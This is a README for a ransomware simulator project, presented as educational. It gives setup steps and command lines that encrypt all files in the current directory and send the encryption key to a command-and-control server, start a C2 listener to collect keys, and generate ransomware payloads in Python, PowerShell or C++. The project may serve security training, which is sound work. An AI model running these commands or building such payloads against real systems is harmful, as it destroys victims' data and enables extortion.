# RanSimulation

This project simulates a ransomware scenario for educational purposes. It includes file encryption, decryption, payload generation, and communication with a Command and Control (C2) server (In development).


## **Setup**

1. Clone the repository:
   ```bash
   git clone https://github.com/CyberSecurityUP/RansomwareSimulator.git
   cd RansomwareSimulator
   ```

2. Install required dependencies:
   ```bash
   pip install cryptography
   ```

3. Ensure Python 3.8+ is installed on your system.

---

## **Usage**

### **1. Encrypt Files**
Encrypt all files in the current directory and send the encryption key to the specified C2 server:
```bash
python3 main.py --encrypt --ip <C2_IP> --port <C2_PORT>
```

Example:
```bash
python3 main.py --encrypt --ip 127.0.0.1 --port 4444
```

### **2. Decrypt Files**
Decrypt all files in the current directory using the provided encryption key:
```bash
python3 main.py --decrypt --key <ENCRYPTION_KEY>
```

Example:
```bash
python3 main.py --decrypt --key "YOUR_ENCRYPTION_KEY"
```

### **3. Start a C2 Listener**
Start a C2 listener to receive encryption keys from clients:
```bash
python3 main.py --listen --ip <LISTEN_IP> --port <LISTEN_PORT>
```

Example:
```bash
python3 main.py --listen --ip 0.0.0.0 --port 4444
```

### **4. Generate Payloads**
Generate a ransomware payload in Python, PowerShell, or C++:
```bash
python3 main.py --generate <LANGUAGE> --ip <C2_IP> --port <C2_PORT>
```

Example:
```bash
python3 main.py --generate python --ip 127.0.0.1 --port 4444
```

Supported languages:
- `python`
- `powershell`
- `c++`

---

